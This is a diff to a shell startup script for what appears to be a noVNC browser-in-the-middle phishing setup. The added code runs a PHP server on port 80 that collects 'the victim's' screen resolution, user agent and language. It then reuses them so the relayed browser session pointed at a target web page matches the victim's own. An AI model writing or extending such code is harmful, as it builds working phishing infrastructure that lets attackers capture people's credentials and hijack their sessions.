@@ -5,10 +5,22 @@
 #=============================#
 
 DISPLAY=:1
+sudo rm -f /tmp/client_info.txt
 sudo rm -f /tmp/.X${DISPLAY#:}-lock
 
 export RESOLUTION=$(cat /tmp/resolution.txt 2> /dev/null)
-RESOLUTION=${RESOLUTION:-1920x1080x24}
+
+# Dynamic mode: no fixed resolution provided — serve a tiny PHP page that asks
+# the victim's browser for its viewport, then read it back from /tmp/client_info.txt.
+if [[ -z "$RESOLUTION" || "$RESOLUTION" == "dynamic" ]]; then
+    echo "URL=$WEBPAGE" > php.ini
+    sudo /bin/bash -c "php -q -S 0.0.0.0:80 &" > /dev/null 2>&1
+    while [ ! "$(cat /tmp/client_info.txt 2> /dev/null | grep 'x24')" ]; do sleep 1 ; done
+    RESOLUTION=$(jq -r .RESOLUTION /tmp/client_info.txt)
+    echo "$RESOLUTION" > /tmp/resolution.txt
+    sudo pkill -9 php
+fi
+
 echo 'starting with' $RESOLUTION
 
 nohup sudo rm -f "/etc/xdg/xfce4/xfconf/xfce-perchannel-xml/xfce4-keyboard-shortcuts.xml"
@@ -23,6 +35,10 @@ nohup sudo /home/user/noVNC/utils/novnc_proxy --vnc localhost:5900 --listen 5980
 nohup sudo socat TCP-LISTEN:80,reuseaddr,fork TCP:localhost:5980 &
 
 URL=$WEBPAGE
+if [ -s /tmp/client_info.txt ]; then
+    USERAGENT=${USERAGENT:-$(jq -r .USERAGENT /tmp/client_info.txt)}
+    CLIENT_LANG=${CLIENT_LANG:-$(jq -r .CLIENT_LANG /tmp/client_info.txt)}
+fi
 USERAGENT=${USERAGENT:-"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"}
 CLIENT_LANG=${CLIENT_LANG:-en-US}
 cp /home/user/noVNC/vnc_lite.html /home/user/noVNC/index.html
